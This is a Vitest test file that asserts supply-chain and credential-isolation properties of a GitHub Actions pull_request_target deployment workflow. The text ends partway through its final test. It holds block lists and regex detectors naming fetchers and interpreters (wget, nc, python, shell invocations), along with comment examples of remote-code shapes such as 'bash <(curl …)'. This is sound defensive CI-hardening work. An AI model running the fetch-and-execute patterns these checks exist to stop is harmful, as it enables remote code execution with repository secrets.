import { readFileSync, readdirSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { asMapping, asScalar, asSequence, parseYamlSubset, scalars, type YamlValue } from "./yaml-subset.js";

/**
 * `Deploy Test` runs on `pull_request_target`: with the base repository's token
 * and secrets, on a pull request an outside contributor may have authored. Its
 * safety is entirely structural -- which job holds which credential, which
 * revision the guard is read from, which overlay is written -- so it is
 * asserted against the parsed document rather than by reading the file.
 */

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const workflowDirectory = join(repoRoot, ".github", "workflows");

function source(name: string): string {
  return readFileSync(join(workflowDirectory, name), "utf8");
}

function workflow(name: string): { readonly [key: string]: YamlValue } {
  return asMapping(parseYamlSubset(source(name)), name);
}

function jobs(name: string): { readonly [key: string]: YamlValue } {
  return asMapping(workflow(name)["jobs"]!, `${name} jobs`);
}

function job(name: string, id: string): { readonly [key: string]: YamlValue } {
  const found = jobs(name)[id];
  if (found === undefined) throw new Error(`${name} has no ${id} job`);
  return asMapping(found, `${name}.${id}`);
}

function steps(name: string, id: string): Array<{ readonly [key: string]: YamlValue }> {
  return asSequence(job(name, id)["steps"]!, `${name}.${id}.steps`).map((step, index) =>
    asMapping(step, `${name}.${id}.steps[${index}]`),
  );
}

/** Everything the job's steps would run or reference, as one searchable string. */
function jobText(name: string, id: string): string {
  return scalars(job(name, id)).join("\n");
}

/**
 * Every `secrets.NAME` reference reachable by one job: its own mapping, plus
 * the workflow's root `env:`, which a job with no `env:` of its own inherits
 * silently. `jobText` -- `scalars(job(...))` alone -- never reads the
 * document root, so a `secrets.*` reference placed there was invisible to
 * every credential-boundary assertion regardless of which job it reached.
 */
function secretsReferenced(name: string, id: string): string[] {
  const rootEnv = workflow(name)["env"];
  const text = [jobText(name, id), rootEnv === undefined ? "" : scalars(rootEnv).join("\n")].join(
    "\n",
  );
  return [...text.matchAll(/secrets\.[A-Za-z0-9_]+/g)].map((match) => match[0]);
}

/** Every value of a `uses` key reachable from `value`, at any depth. */
function usesReferences(value: YamlValue): string[] {
  if (typeof value === "string") return [];
  if (Array.isArray(value)) return value.flatMap((item) => usesReferences(item));
  return Object.entries(value).flatMap(([key, item]) =>
    key === "uses" ? [asScalar(item, "uses")] : usesReferences(item),
  );
}

/** Every mapping key reachable from `value`, at any depth. */
function keysOf(value: YamlValue): string[] {
  if (typeof value === "string") return [];
  if (Array.isArray(value)) return value.flatMap((item) => keysOf(item));
  return Object.entries(value).flatMap(([key, item]) => [key, ...keysOf(item)]);
}

/** A step's `with:` block, or an empty mapping when it declares none. */
function withBlock(
  step: { readonly [key: string]: YamlValue },
  path: string,
): { readonly [key: string]: YamlValue } {
  return step["with"] === undefined ? {} : asMapping(step["with"], `${path}.with`);
}

/**
 * A `uses:` line, however the step is laid out. When `uses` is a step's first
 * key it carries the sequence dash -- `- uses: …` -- which GitHub Actions
 * accepts and an expression anchored to `^\s*uses:` does not match.
 */
const USES_LINE = /^\s*(?:-\s+)?uses:/gm;

/** The pin check, as applied to one workflow's source. */
function expectEveryActionPinned(name: string, text: string): void {
  // Read from the parsed document, not from the source. A line-anchored
  // `uses:\s*(\S+)$` cannot match a line carrying a trailing comment --
  // which GitHub Actions accepts -- so `uses: x@main # pinned` was never
  // collected and never checked. The parser keeps the comment in the value,
  // which is what makes it fail the pin pattern below.
  const references = usesReferences(parseYamlSubset(text));
  expect(references.length).toBeGreaterThan(0);
  // Every `uses:` in the file must be one of the references checked: a
  // reference the traversal cannot reach is a reference nothing pins.
  expect(references.length).toBe([...text.matchAll(USES_LINE)].length);
  for (const reference of references) {
    expect(reference, `${name} does not pin ${reference}`).toMatch(/^[^@\s]+@[0-9a-f]{40}$/);
  }
}

/** Each pinned `uses:` reference paired with the comment line above it. */
function pinAnnotations(name: string): Array<readonly [string, string]> {
  const lines = source(name).split("\n");
  return lines.flatMap((line, index) => {
    const reference = /^\s*(?:-\s+)?uses:\s*(\S+)/.exec(line)?.[1];
    if (reference === undefined) return [];
    const previous = lines[index - 1] ?? "";
    const comment = /^\s*#\s*(.*)$/.exec(previous)?.[1];
    expect(comment, `${name}:${index + 1} pins ${reference} with no comment saying what it is`)
      .toBeDefined();
    return [[reference, comment!] as const];
  });
}

const DEPLOY_TEST = "deploy-test.yml";
const VALIDATE = "validate.yml";

/**
 * The one `docker buildx build` the workflow publishes both its images with:
 * the step declaring it, that step's whole script, and the invocation itself
 * folded to a single line.
 *
 * The images are published by calling one shell function twice, so one
 * invocation carries every flag that applies to both. That is why the count
 * is asserted here rather than left implicit -- split into two invocations
 * and any per-invocation guarantee below could hold for one image and not the
 * other, while a check that merely found *a* correct build stayed green.
 */
function publishInvocation(name: string): {
  readonly step: { readonly [key: string]: YamlValue };
  readonly script: string;
  readonly invocation: string;
} {
  const publishing = Object.keys(jobs(name)).flatMap((id) =>
    steps(name, id).filter(
      (step) => typeof step["run"] === "string" && step["run"].includes("docker buildx build"),
    ),
  );
  expect(publishing, `${name} does not publish its images from exactly one step`).toHaveLength(1);
  const step = publishing[0]!;
  const script = asScalar(step["run"]!, `${name} publish run`);
  const invocations = commands(script).filter((line) => line.includes("docker buildx build"));
  expect(invocations, `${name} does not build both images with one invocation`).toHaveLength(1);
  return { step, script, invocation: invocations[0]! };
}

/** Each `run:` body in one job, paired with the step index holding it. */
function jobScripts(name: string, id: string): Array<readonly [number, string]> {
  return steps(name, id).flatMap((step, index) =>
    step["run"] === undefined
      ? []
      : [[index, asScalar(step["run"], `${name}.${id}.steps[${index}].run`)] as const],
  );
}

/** Every `run:` body in a workflow, paired with where it was found. */
function everyScript(name: string): Array<readonly [string, string]> {
  return Object.keys(jobs(name)).flatMap((id) =>
    jobScripts(name, id).map(([index, script]) => [`${id}.steps[${index}]`, script] as const),
  );
}

/**
 * Shell lines with `\` continuations folded, so one command is one entry, and
 * comment lines dropped, so prose about a command is not mistaken for one.
 *
 * The dropping matters: every check below is a search for something a script
 * must not do, and a comment saying "this deliberately does not run `npm
 * install`" is the sentence most likely to be written next to a script that
 * deliberately does not run `npm install`.
 */
function commands(script: string): string[] {
  const folded: string[] = [];
  for (const line of script.split("\n")) {
    const previous = folded[folded.length - 1];
    if (previous !== undefined && previous.endsWith("\\")) {
      folded[folded.length - 1] = `${previous.slice(0, -1).trimEnd()} ${line.trim()}`;
    } else {
      folded.push(line.trim());
    }
  }
  return folded.filter((line) => !line.startsWith("#"));
}

/**
 * Every `run:` body that interpolates a workflow expression into the shell.
 *
 * `${{ … }}` is substituted into the script *before* a shell ever sees it, so
 * an expression carrying head-controlled text -- a PR title, a branch name --
 * becomes head-controlled shell in a job that may hold a credential. Every
 * workflow here passes values through `env:` instead, where they arrive as
 * shell variables and stay data. Read from the **parsed** (and, for a block
 * scalar, folded) string: a `>-` folded body can carry `${{` and `}}` on two
 * different physical lines of source, which a single-line grep pattern such
 * as `\$\{\{.*\}\}` does not span but the folded string does.
 */
function interpolationOffences(scripts: ReadonlyArray<readonly [string, string]>): string[] {
  return scripts.filter(([, body]) => body.includes("${{")).map(([where]) => where);
}

/**
 * One folded line split at the shell's own command boundaries, so a check on
 * "the command" is not fooled by `true && git fetch origin`.
 */
function logicalCommands(line: string): string[] {
  return line
    .split(/&&|\|\||[;|]/)
    .map((part) => part.trim())
    .filter((part) => part.length > 0);
}

/**
 * Everything a promoting job is allowed to do with `git`.
 *
 * An allowlist, not a blacklist of forbidden subcommands: a blacklist that
 * requires the subcommand to follow `git` immediately walks straight past
 * `git -C gitops fetch origin pull/1/head` -- and `git -C <path>` is the form
 * `scripts/update-gitops-digest.sh` and `promote` both use throughout.
 */
const GIT_SUBCOMMANDS: readonly string[] = ["config", "add", "diff", "commit", "push"];

/**
 * `git` as the start of a command: at the start of a logical command, after
 * whitespace, or inside a substitution -- `staged="$(git diff …)"` is a real
 * invocation and must be checked. Deliberately not `\bgit\b`, which also
 * matches the `.git` at the end of a push URL and would fail the one line the
 * job exists to run.
 *
 * The command word is matched on its **basename**, because a command word is
 * a path: an expression anchored on a bare `git` refuses `git -C gitops
 * fetch` and admits `/usr/bin/git -C gitops fetch`, the same invocation
 * spelled the way anyone routing around an allowlist would spell it.
 */
const GIT_INVOCATION = /(?:^|[\s(`{])(?:[^\s]*\/)?git\s+/g;

/** Every `git` invocation in one logical command that is not on the allowlist. */
function gitOffences(command: string): string[] {
  const offences: string[] = [];
  for (const match of command.matchAll(GIT_INVOCATION)) {
    const rest = command.slice(match.index + match[0].length).trim().split(/\s+/);
    // `-C <path>` is tolerated and nothing else is: it selects the worktree,
    // not the operation.
    const subcommand = rest[0] === "-C" ? rest[2] : rest[0];
    if (subcommand === undefined || !GIT_SUBCOMMANDS.includes(subcommand)) {
      offences.push(`git ${subcommand ?? "(nothing)"}`);
    }
  }
  return offences;
}

const FORBIDDEN_COMMANDS: ReadonlyArray<readonly [string, RegExp]> = [
  ["reaches GitHub through the gh CLI", /\bgh\s+(?:pr|repo|api|run|release)\b/],
  ["runs a Node package manager", /\b(?:npm|npx|pnpm|yarn)\b/],
  ["builds or runs a container", /\bdocker\s+(?:build|run)\b/],
];

/**
 * Interpreters, and a couple of long-dead-but-still-real fetchers, `promote`
 * never legitimately invokes as a word -- checked without regard to
 * position. The blacklist this replaced matched only `curl … | sh|bash|
 * node|python`, i.e. one fetcher, piped, into one of four interpreters: it
 * missed `wget` outright, missed `bash <(curl …)` (no pipe at all), and
 * missed a fetch staged across separate commands (`curl -o x; chmod +x x;
 * ./x`) since no single line combined a fetch with an execution. This checks
 * every word, in every position, in every logical command.
 */
const BANNED_REMOTE_WORDS = /\b(wget|ftp|nc|ncat|python3?|perl|ruby|node)\b/;

/**
 * The one shell invocation `promote` legitimately makes: the deploys
 * repository's own, already-checked-out manifest test -- content that
 * arrived via `actions/checkout` of `hannosirkel/deploys`, never from the
 * head. An allowlist of that one exact shape, not a blacklist of shapes
 * imagined in advance: `sh`, `bash`, `zsh`, `dash` or `ksh` heading anything
 * else -- `bash <(curl …)`, `sh /tmp/hook.sh` -- is refused.
 */
const SHELL_INVOCATION = /(?:^|[\s;&|(`])(sh|bash|zsh|dash|ksh)(?:\s|$)/;
const ALLOWED_SHELL_INVOCATION = "bash lousydeal/tests/manifests.sh";

/**
 * `curl` never legitimately writes its response to a file in this job --
 * both real calls pipe straight to a variable -- and never uses a fused
 * short-flag cluster; both real calls spell every flag long
 * (`--fail --silent --show-error`, never `-fsS`). `-sSLo file` is refused by
 * the short-flag rule without needing to recognise `-o` as its own token,
 * which a cluster like `-sSLo` never presents it as.
 */
function curlOffence(command: string): string | undefined {
  if (!/\bcurl\b/.test(command)) return undefined;
  const withoutLongFlags = command.replace(/--[A-Za-z-]+(?:=\S+)?/g, "");
  if (/(?:^|\s)-[A-Za-z]/.test(withoutLongFlags)) {
    return `uses a short curl flag, which this job's real calls never do: ${command}`;
  }
  if (/--output\b|(?:^|\s)>/.test(command)) {
    return `writes curl's output to a file: ${command}`;
  }
  return undefined;
}

/** Everything one logical command does that a job holding the GitOps credential must not. */
function remoteCodeOffences(command: string): string[] {
  const offences: string[] = [];
  const banned = BANNED_REMOTE_WORDS.exec(command);
  if (banned !== null) offences.push(`invokes ${banned[1]}: ${command}`);
  if (SHELL_INVOCATION.test(command) && command.trim() !== ALLOWED_SHELL_INVOCATION) {
    offences.push(`invokes a shell interpreter outside its one allowed shape: ${command}`);
  }
  const curl = curlOffence(command);
  if (curl !== undefined) offences.push(curl);
  return offences;
}

/**
 * Everything wrong with the `run:` bodies of a job that holds the GitOps
 * credential: code arriving (by `git`, by a fetcher, by an interpreter, or by
 * `curl` writing a file it could later execute), or an expression being
 * interpolated into a shell.
 */
function codeImportOffences(scripts: ReadonlyArray<readonly [number, string]>): string[] {
  const offences: string[] = [];
  for (const [index, script] of scripts) {
    for (const line of commands(script)) {
      for (const [what, pattern] of FORBIDDEN_COMMANDS) {
        if (pattern.test(line)) offences.push(`steps[${index}] ${what}: ${line}`);
      }
      for (const command of logicalCommands(line)) {
        for (const offence of gitOffences(command)) {
          offences.push(`steps[${index}] runs ${offence}: ${command}`);
        }
        for (const offence of remoteCodeOffences(command)) {
          offences.push(`steps[${index}] ${offence}`);
        }
      }
    }
  }
  return offences;
}

describe("every workflow in this repository", () => {
  const names = readdirSync(workflowDirectory).filter((entry) => entry.endsWith(".yml"));

  it("includes the validation and the test-promotion workflows", () => {
    expect(names).toContain(VALIDATE);
    expect(names).toContain(DEPLOY_TEST);
  });

  for (const name of names) {
    it(`${name} interpolates no expression into any run: body`, () => {
      expect(
        interpolationOffences(everyScript(name)),
        `${name} interpolates a workflow expression into a shell script`,
      ).toEqual([]);
    });
  }

  for (const name of names) {
    it(`${name} pins every action to a 40-character commit SHA`, () => {
      expectEveryActionPinned(name, source(name));
    });

    it(`${name} says in a comment which release each pinned SHA is`, () => {
      for (const [reference, comment] of pinAnnotations(name)) {
        const action = reference.split("@")[0]!;
        expect(comment, `${name} annotates ${reference} as "${comment}"`).toMatch(
          new RegExp(`^${action.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} v\\S+$`),
        );
      }
    });

    it(`${name} declares explicit permissions for every job`, () => {
      // A job inherits the workflow-level grant when it declares none, so the
      // effective grant is what matters -- and it must always be written down.
      const fallback = workflow(name)["permissions"];
      for (const [id, body] of Object.entries(jobs(name))) {
        const permissions = asMapping(body, `${name}.${id}`)["permissions"] ?? fallback;
        expect(permissions, `${name}.${id} has no effective permissions`).toBeDefined();
        for (const scope of Object.values(asMapping(permissions!, `${name}.${id}.permissions`))) {
          expect(["read", "write", "none"]).toContain(asScalar(scope, "permission"));
        }
      }
    });
  }

  it("annotates one commit SHA the same way in every workflow", () => {
    // Two files pinning the same SHA to different releases means at least one
    // comment is false, and a false comment is worse than none: it is what a
    // reader checks the pin against.
    const annotations = new Map<string, Map<string, string[]>>();
    for (const name of names) {
      for (const [reference, comment] of pinAnnotations(name)) {
        const byComment = annotations.get(reference) ?? new Map<string, string[]>();
        byComment.set(comment, [...(byComment.get(comment) ?? []), name]);
        annotations.set(reference, byComment);
      }
    }
    for (const [reference, byComment] of annotations) {
      expect(
        [...byComment].map(([comment, where]) => `${comment} (${where.join(", ")})`),
        `${reference} is annotated inconsistently`,
      ).toHaveLength(1);
    }
  });
});

describe("the pin check itself", () => {
  // The check above is only as good as what it accepts and what it refuses,
  // and neither is observable from workflows that all happen to be written
  // one way. These drive it with sources this repository does not contain.

  /** A minimal single-job workflow wrapped around the given `steps:` lines. */
  function workflowAround(step: readonly string[]): string {
    return [
      "---",
      "name: Fixture",
      "'on': push",
      "permissions: {}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-24.04",
      "    steps:",
      ...step,
      "",
    ].join("\n");
  }

  const PINNED = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1";

  it("accepts a correctly pinned step whose first key is `uses`", () => {
    // `- uses: …` is ordinary GitHub Actions. A cross-check anchored to
    // `^\s*uses:` never matched the line, so the parsed reference had no
    // counterpart in the source and the count disagreed -- rejecting a
    // properly pinned action for how its step is laid out.
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      # actions/checkout v7.0.1",
          `      - uses: ${PINNED}`,
          "        with:",
          "          persist-credentials: false",
        ]),
      ),
    ).not.toThrow();
  });

  it("still refuses a mutable ref hidden behind a trailing comment", () => {
    // A grep anchored to `@[0-9a-f]{40}$` passes this line: the ref really is
    // `main`, but the comment after it is what sits at the end of the line.
    // The parser reads the whole scalar, comment included, so the pin pattern
    // -- which requires no trailing text -- correctly fails it.
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      - name: Set up Buildx",
          "        # docker/setup-buildx-action v4.2.0",
          "        uses: docker/setup-buildx-action@main # unpinned, mutable ref",
        ]),
      ),
    ).toThrow(/does not pin/);
  });

  it("refuses a mutable ref on a step whose first key is `uses`", () => {
    expect(() =>
      expectEveryActionPinned(
        "fixture.yml",
        workflowAround([
          "      # docker/setup-buildx-action v4.2.0",
          "      - uses: docker/setup-buildx-action@main # unpinned, mutable ref",
        ]),
      ),
    ).toThrow(/does not pin/);
  });
});

describe("Deploy Test's trigger and concurrency", () => {
  it("fires only on a label applied to a pull request targeting main", () => {
    const document = workflow(DEPLOY_TEST);
    expect(document["name"]).toBe("Deploy Test");
    const on = asMapping(document["on"]!, "on");
    expect(Object.keys(on)).toEqual(["pull_request_target"]);
    const trigger = asMapping(on["pull_request_target"]!, "pull_request_target");
    expect(asSequence(trigger["branches"]!, "branches")).toEqual(["main"]);
    expect(asSequence(trigger["types"]!, "types")).toEqual(["labeled"]);
  });

  it("does not cancel an in-flight promotion", () => {
    const concurrency = asMapping(workflow(DEPLOY_TEST)["concurrency"]!, "concurrency");
    expect(concurrency["group"]).toBe("lousydeal-gitops-promotion");
    expect(concurrency["cancel-in-progress"]).toBe("false");
  });

  it("grants the workflow no permissions by default", () => {
    expect(asMapping(workflow(DEPLOY_TEST)["permissions"]!, "permissions")).toEqual({});
  });

  it("runs the gate only for the deploy-test label on an open pull request", () => {
    const condition = asScalar(job(DEPLOY_TEST, "gate")["if"]!, "gate.if");
    expect(condition).toMatch(/github\.event\.label\.name == 'deploy-test'/);
    expect(condition).toMatch(/github\.event\.pull_request\.state == 'open'/);
  });
});

describe("Deploy Test's three-job split and its job permissions", () => {
  // The reference implementation this row adapts uses four jobs: `gate`,
  // `build`, `recheck`, `promote`. This row drops `recheck` as a *job* and
  // folds its check -- the pull request is still open, still same-head,
  // still labelled -- into `promote`'s own first step, run before any
  // credential is minted and before anything is checked out. That keeps both
  // halves of the split (see the two describe blocks below) and shrinks the
  // gap between "re-verified" and "credential minted" to zero rather than one
  // job-scheduling boundary. It is why `promote` below carries
  // `pull-requests: read` rather than the reference's `{}` -- that scope is
  // spent on the re-verification read, not on anything credentialed.
  const expected: ReadonlyArray<readonly [string, Record<string, string>]> = [
    ["gate", { actions: "read", contents: "read", "pull-requests": "read" }],
    ["build", { contents: "read", packages: "write" }],
    ["promote", { "pull-requests": "read" }],
  ];

  it("declares exactly these three jobs", () => {
    expect(Object.keys(jobs(DEPLOY_TEST))).toEqual(expected.map(([id]) => id));
  });

  for (const [id, permissions] of expected) {
    it(`gives ${id} exactly ${JSON.stringify(permissions)}`, () => {
      expect(asMapping(job(DEPLOY_TEST, id)["permissions"]!, `${id}.permissions`)).toEqual(
        permissions,
      );
    });
  }

  it("scopes the deployer credential to the promote job's test environment", () => {
    for (const id of ["gate", "build"]) {
      expect(job(DEPLOY_TEST, id)["environment"]).toBeUndefined();
      // A blanket ban, not a name check: asserting only that
      // `LOUSYDEAL_DEPLOYER_` is absent lets any *other* secret --
      // `secrets.SOME_OTHER_DEPLOY_KEY`, or a name nobody has thought of yet
      // -- walk into the job that runs head code. `secretsReferenced` also
      // reads the workflow's own root `env:` (there is none today, but a job
      // with no `env:` of its own inherits one that exists), which
      // `jobText` -- `scalars(job(...))` alone -- cannot see at all.
      expect(secretsReferenced(DEPLOY_TEST, id), `${id} references a secret`).toEqual([]);
    }
    expect(job(DEPLOY_TEST, "promote")["environment"]).toBe("test");
    expect([...new Set(secretsReferenced(DEPLOY_TEST, "promote"))].sort()).toEqual([
      "secrets.LOUSYDEAL_DEPLOYER_CLIENT_ID",
      "secrets.LOUSYDEAL_DEPLOYER_PRIVATE_KEY",
    ]);
  });
});

describe("the gate reads the guard from the base SHA", () => {
  it("checks nothing out and runs no head code", () => {
    for (const step of steps(DEPLOY_TEST, "gate")) {
      expect(step["uses"]).toBeUndefined();
    }
    expect(jobText(DEPLOY_TEST, "gate")).not.toMatch(/npm (ci|test)|docker build/);
  });

  it("fetches scripts/update-gitops-digest.sh at the base SHA, never the head SHA", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/BASE_SHA/);
    expect(gate).toMatch(/github\.event\.pull_request\.base\.sha/);
    expect(gate).toMatch(/contents\/scripts\/update-gitops-digest\.sh\?ref=\$\{BASE_SHA\}/);
    expect(gate).not.toMatch(/update-gitops-digest\.sh\?ref=\$\{HEAD_SHA\}/);
    expect(gate).toMatch(/grep -qx '#!\/bin\/sh'/);
  });

  it("verifies the pull request is open, same-repository and targets main", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/\[ "\$BASE_REF" = main \]/);
    expect(gate).toMatch(/\[ "\$HEAD_REPOSITORY" = "\$REPOSITORY" \]/);
    expect(gate).toMatch(/\.state == "open"/);
    expect(gate).toMatch(/\.head\.repo\.full_name == \$repository/);
    expect(gate).toMatch(/\.head\.sha == \$head_sha/);
    expect(gate).toMatch(/\^\[0-9a-f\]\{40\}\$/);
  });

  it("requires that head SHA's Validate run to have concluded success", () => {
    const gate = jobText(DEPLOY_TEST, "gate");
    expect(gate).toMatch(/head_sha=\$\{HEAD_SHA\}/);
    expect(gate).toMatch(/select\(\.name == "Validate"/);
    expect(gate).toMatch(/\[ "\$conclusion" = success \]/);
  });

  it("hands the guard to the promotion, and only to the promotion", () => {
    expect(asMapping(job(DEPLOY_TEST, "gate")["outputs"]!, "gate.outputs")["guard"]).toBe(
      "${{ steps.verify.outputs.guard }}",
    );
    expect(jobText(DEPLOY_TEST, "build")).not.toMatch(/needs\.gate\.outputs\.guard|GUARD_CONTENT/);
    expect(jobText(DEPLOY_TEST, "promote")).toMatch(/needs\.gate\.outputs\.guard/);
    expect(jobText(DEPLOY_TEST, "promote")).not.toMatch(/needs\.build\.outputs\.guard/);
  });
});

describe("the label and state gates fail closed, not merely in the right position", () => {
  // Position and wording are not the property. `jq -e` is what makes a
  // mismatched or absent field abort the script under `set -e`; without
  // `-e`, `jq` prints `false` (or nothing, for an absent field) and exits 0,
  // and the check becomes decoration -- `promote` spends the credential
  // regardless of what it found. Five ways to make that happen, all checked:
  // `jq -e` -> `jq`, a trailing `|| true`, `continue-on-error: true` on the
  // step, the same on the job, and a step- or job-level `if:` that could skip
  // it. `set -euo pipefail` heading the script is what the other four rest
  // on -- without it, even a correctly-`-e`'d `jq` failing would not abort
  // anything.
  //
  // Both gate's own PR-state filter and promote's folded-in re-verification
  // close with the identical, otherwise-unique line
  // `' >/dev/null <<<"$pull_request"` -- one regex spanning from `jq -e` to
  // that line, anchored at end-of-line, catches the flag dropping *and* a
  // `|| true` appended after it (which would move the line's own end past the
  // anchor) in a single assertion.
  const CLOSING = '\' >/dev/null <<<"$pull_request"';
  const CLOSING_PATTERN = CLOSING.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

  function gatingStep(id: string): { readonly script: string; readonly step: { readonly [key: string]: YamlValue } } {
    const index = steps(DEPLOY_TEST, id).findIndex(
      (candidate) => typeof candidate["run"] === "string" && candidate["run"].includes(CLOSING),
    );
    expect(index, `${id} has no step running the expected gating filter`).toBeGreaterThanOrEqual(0);
    const step = steps(DEPLOY_TEST, id)[index]!;
    return { script: asScalar(step["run"]!, `${id} gating script`), step };
  }

  for (const id of ["gate", "promote"]) {
    it(`${id}'s gating filter aborts the step when it is false, absent, or tolerated`, () => {
      const { script, step } = gatingStep(id);
      expect(script, `${id} does not run under set -e`).toMatch(/^set -euo pipefail$/m);
      expect(
        script,
        `${id}'s gating filter is not run with jq -e, or is tolerated by a trailing || true`,
      ).toMatch(new RegExp(`jq -e[a-z]*\\b[\\s\\S]*?${CLOSING_PATTERN}$`, "m"));
      expect(step["continue-on-error"], `${id}'s gating step tolerates its own failure`).toBeUndefined();
      expect(step["if"], `${id}'s gating step carries a step-level conditional`).toBeUndefined();
      expect(
        job(DEPLOY_TEST, id)["continue-on-error"],
        `${id} tolerates a failed step`,
      ).toBeUndefined();
    });
  }

  it("promote itself carries no job-level conditional that could skip the re-verification", () => {
    // `gate`'s job-level `if:` is the real trigger gate and is asserted
    // elsewhere; `promote` needing `gate`, `build` and nothing else is
    // asserted in the ordering test above. This is the property those two
    // do not cover: `promote` itself must run unconditionally once its
    // dependencies succeed, so the re-verification step inside it is not
    // itself skippable by a job-level `if:`.
    expect(job(DEPLOY_TEST, "promote")["if"]).toBeUndefined();
  });
});

describe("the build holds no GitOps credential", () => {
  it("checks out the gated head SHA without persisting credentials", () => {
    const checkout = steps(DEPLOY_TEST, "build").find((step) =>
      typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkout).toBeDefined();
    const withBlock = asMapping(checkout!["with"]!, "build checkout with");
    expect(withBlock["ref"]).toBe("${{ needs.gate.outputs.head_sha }}");
    expect(withBlock["persist-credentials"]).toBe("false");
  });

  it("never checks out or writes the deploys repository", () => {
    const build = jobText(DEPLOY_TEST, "build");
    expect(build).not.toMatch(/hannosirkel\/deploys/);
    expect(build).not.toMatch(/lousydeal\/overlays/);
  });

  it("builds and publishes both images with attestations", () => {
    const build = jobText(DEPLOY_TEST, "build");
    expect(build).toMatch(/--provenance=mode=min/);
    expect(build).toMatch(/--sbom=true/);
    expect(build).not.toMatch(/--provenance=false/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-backend/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-storefront/);
    const outputs = asMapping(job(DEPLOY_TEST, "build")["outputs"]!, "build.outputs");
    expect(Object.keys(outputs).sort()).toEqual(["backend_digest", "storefront_digest"]);
  });

  it("guards each published digest against the sentinel's own shape, and never a tag", () => {
    // A promotion must write a digest and never a tag: T13's overlays and
    // `deploys/lousydeal/tests/manifests.sh` already hold that property on the
    // *written* side (`^sha256:[0-9a-f]{64}$`, on the committed file). This is
    // the same property enforced on the *writing* side: the value extracted
    // from `docker buildx build`'s own metadata is refused, before it is ever
    // handed to `promote`, unless it already has that exact shape.
    const { script } = publishInvocation(DEPLOY_TEST);
    const guardLines = commands(script).filter((line) =>
      line.includes(`grep -Eq '^sha256:[0-9a-f]{64}$'`),
    );
    expect(guardLines, "no line guards the extracted digest's shape").toHaveLength(1);
    // It has to run on the value docker actually produced, not a copy: the
    // guarded variable must be the same one the function's own output line
    // emits, or the check and the write could name two different things.
    expect(script).toMatch(/digest="\$\(jq -er '\."containerimage\.digest"' "\$metadata"\)"/);
    expect(script.indexOf(guardLines[0]!)).toBeGreaterThan(script.indexOf('digest="$(jq'));
    expect(script.indexOf(guardLines[0]!)).toBeLessThan(script.indexOf("${output}=$digest"));
  });

  it("publishes each Dockerfile's final stage, naming no other target", () => {
    // `--target build` would ship the compiler stage rather than the runtime
    // stage `scripts/images.test.ts` makes its guarantees about -- `USER
    // 10001:10001` and a cleared `ENTRYPOINT` (images.test.ts:334-343) -- with
    // both assertions still green, because the file they read did not change.
    expect(
      publishInvocation(DEPLOY_TEST).invocation,
      `${DEPLOY_TEST} publishes a named stage, so the Dockerfile assertions describe a different image`,
    ).not.toMatch(/(?:^|\s)--target(?:[=\s]|$)/);
  });
});

/** The promote step that commits and pushes, as its shell source. */
function commitScript(name: string): string {
  const commit = steps(name, "promote")
    .map((step) => (typeof step["run"] === "string" ? step["run"] : ""))
    .find((run) => run.includes("git push"));
  expect(commit, `${name} promote has no step that pushes`).toBeDefined();
  return commit!;
}

describe("the promotion writes exactly one overlay", () => {
  it("re-verifies the pull request before minting or spending any credential", () => {
    const promoteSteps = steps(DEPLOY_TEST, "promote");
    const recheckIndex = promoteSteps.findIndex((step) =>
      typeof step["run"] === "string" && step["run"].includes('any(.labels[]; .name == "deploy-test")'),
    );
    const tokenIndex = promoteSteps.findIndex((step) => step["id"] === "app-token");
    expect(recheckIndex, "promote never re-verifies the pull request").toBeGreaterThanOrEqual(0);
    expect(tokenIndex, "promote never mints a token").toBeGreaterThanOrEqual(0);
    expect(recheckIndex, "the re-verification runs after the credential is minted").toBeLessThan(
      tokenIndex,
    );

    const recheck = asScalar(promoteSteps[recheckIndex]!["run"]!, "promote recheck run");
    expect(recheck).toMatch(/\.state == "open"/);
    expect(recheck).toMatch(/any\(\.labels\[\]; \.name == "deploy-test"\)/);
    // The re-verification step itself must hold no credential either: it is a
    // read against the GitHub API with the workflow's own scoped token, not
    // the GitOps deployer's. Blanket, not a name check -- see
    // `secretsReferenced`.
    expect(recheck.match(/secrets\.[A-Za-z0-9_]+/g) ?? []).toEqual([]);

    expect(asSequence(job(DEPLOY_TEST, "promote")["needs"]!, "promote.needs")).toEqual([
      "gate",
      "build",
    ]);
  });

  it("mints a token scoped to the deploys repository alone", () => {
    const promote = jobText(DEPLOY_TEST, "promote");
    expect(promote).toMatch(/"repositories":\["deploys"\]/);
    expect(promote).toMatch(/::add-mask::/);
    const checkouts = steps(DEPLOY_TEST, "promote").filter(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkouts, "promote checks out more than one tree").toHaveLength(1);
    const inputs = withBlock(checkouts[0]!, "promote checkout");
    expect(inputs["repository"]).toBe("hannosirkel/deploys");
    expect(inputs["path"]).toBe("gitops");
    expect(inputs["persist-credentials"]).toBe("false");
    expect(inputs["ref"]).toBeUndefined();
  });

  it("runs no head code in the job that holds the GitOps credential", () => {
    // Checking the *first* checkout in the job proves nothing: a second one,
    // later in the same job, would put head-authored code on disk next to a
    // write token for hannosirkel/deploys. So every step is examined, and so
    // is the job itself -- a job-level `container:` naming a head-built
    // digest (`ghcr.io/hannosirkel/lousydeal-backend@${{
    // needs.build.outputs.backend_digest }}`) would run every one of this
    // job's steps, App-token mint and `git push` included, *inside* an image
    // built from the pull request's own Dockerfile, with every per-step
    // assertion below still green. `services:` is the identical hole one
    // level down. Four ways head code could arrive, all four checked.
    const promoteJob = job(DEPLOY_TEST, "promote");
    expect(Object.keys(promoteJob), "promote runs inside a job-level container").not.toContain(
      "container",
    );
    expect(
      Object.keys(promoteJob),
      "promote declares a job-level services container",
    ).not.toContain("services");

